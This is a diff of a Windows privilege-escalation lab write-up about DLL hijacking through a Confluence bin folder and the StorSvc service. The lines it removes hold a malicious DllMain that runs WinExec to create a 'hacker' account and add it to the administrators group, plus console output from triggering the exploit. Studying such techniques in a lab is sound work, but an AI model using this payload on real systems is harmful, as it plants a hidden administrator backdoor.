@@ -84,33 +84,8 @@ certain libraries, even though these libraries were never present on the system.
 
 ## Compiling the dll:
 
-```
-#include <windows.h>
-#include <stdlib.h>
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
-    if (reason == DLL_PROCESS_ATTACH) {
-        WinExec("cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add", 0);
-    }
-    return TRUE;
-}
-```
-
-> Compile it:
-
-```shell
-
-```
-
-
----
-
 > Downloaded the SprintCSP.dll and .exe file. Copy it the dll into \Confluence\bin, and execute the .exe file.
 
 ```powershell
-PS C:\Users\Student\Downloads> .\WIN10RpcClient.exe
-[!] Manual reboot of StorSvc service is required.
-PS C:\Users\Student\Downloads> sc stop StorSvc
-PS C:\Users\Student\Downloads> sc start StorSvc
-PS C:\Users\Student\Downloads>    
+ Get-Process | Where-Object {$_.Description -like "*Confluence*" -or $_.Description -like "*Tomcat*"}
 ```
